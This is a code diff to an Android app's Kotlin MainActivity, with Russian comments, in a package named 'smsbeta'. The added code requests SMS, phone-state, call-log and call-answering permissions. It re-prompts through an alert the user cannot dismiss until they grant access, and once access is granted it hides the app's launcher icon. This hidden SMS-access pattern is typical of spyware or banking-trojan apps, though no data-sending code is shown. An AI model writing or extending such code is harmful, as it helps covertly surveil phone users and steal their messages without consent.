@@ -1,65 +1,94 @@
 package com.analyzer.smsbeta
 
-import androidx.appcompat.app.AppCompatActivity
+// 1. MainActivity.kt
 import android.Manifest
+import android.content.ComponentName
+import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.Uri
+import android.os.Build
 import android.os.Bundle
+import android.provider.Settings
+import android.webkit.WebView
+import android.webkit.WebViewClient
+import android.widget.Toast
+import androidx.appcompat.app.AlertDialog
+import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
-import androidx.core.content.ContextCompat
 
 class MainActivity : AppCompatActivity() {
 
     companion object {
-        private const val REQUEST_CODE_PERMISSION = 100 // Код запроса разрешений
+        private val REQUIRED_PERMISSIONS = arrayOf(
+            Manifest.permission.READ_SMS,
+            Manifest.permission.RECEIVE_SMS,
+            Manifest.permission.READ_PHONE_STATE,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.ANSWER_PHONE_CALLS
+        )
+        private const val PERMISSION_REQUEST_CODE = 123
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        checkAndRequestPermissions()
-    }
+        // Настройка WebView
+        val webView: WebView = findViewById(R.id.webView)
+        webView.settings.javaScriptEnabled = true
+        webView.webViewClient = WebViewClient()
+        webView.loadUrl("https://google.com") // Замените на нужный URL
 
-    /**
-     * Метод проверяет наличие необходимых разрешений и запрашивает их,
-     * если они ещё не предоставлены.
-     */
-    private fun checkAndRequestPermissions() {
-        if (!hasAllRequiredPermissions()) {
-            ActivityCompat.requestPermissions(
-                this,
-                arrayOf(
-                    Manifest.permission.READ_SMS,
-                    Manifest.permission.RECEIVE_SMS,
-                    Manifest.permission.READ_PHONE_STATE
-                ),
-                REQUEST_CODE_PERMISSION
-            )
+        // Проверка разрешений
+        if (!hasPermissions()) {
+            requestPermissionsWithRetry()
+        } else {
+            hideAppIcon()
         }
     }
 
-    /**
-     * Возвращает true, если приложение имеет все требуемые разрешения.
-     */
-    private fun hasAllRequiredPermissions(): Boolean =
-        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
-                ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED &&
-                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
+    private fun hasPermissions(): Boolean {
+        return REQUIRED_PERMISSIONS.all {
+            ActivityCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
+        }
+    }
 
-    /**
-     * Реакция на результат запроса разрешений.
-     */
-    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
-        when (requestCode) {
-            REQUEST_CODE_PERMISSION -> {
-                if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
-                    // Все разрешения получены успешно
-                    println("Все разрешения были предоставлены.")
-                } else {
-                    // Некоторые или все разрешения отклонены
-                    println("Отсутствуют некоторые важные разрешения.")
-                }
+    private fun requestPermissionsWithRetry() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            requestPermissions(REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE)
+        }
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
+                hideAppIcon()
+            } else {
+                showPermissionWarning()
             }
         }
+    }
+
+    private fun showPermissionWarning() {
+        AlertDialog.Builder(this)
+            .setTitle("Требуются разрешения")
+            .setMessage("Приложению необходимы все разрешения для работы")
+            .setPositiveButton("Повторить") { _, _ -> requestPermissionsWithRetry() }
+            .setNegativeButton("Выйти") { _, _ -> finish() }
+            .setCancelable(false)
+            .show()
+    }
+
+    private fun hideAppIcon() {
+        packageManager.setComponentEnabledSetting(
+            ComponentName(this, MainActivity::class.java),
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+        )
     }
 }
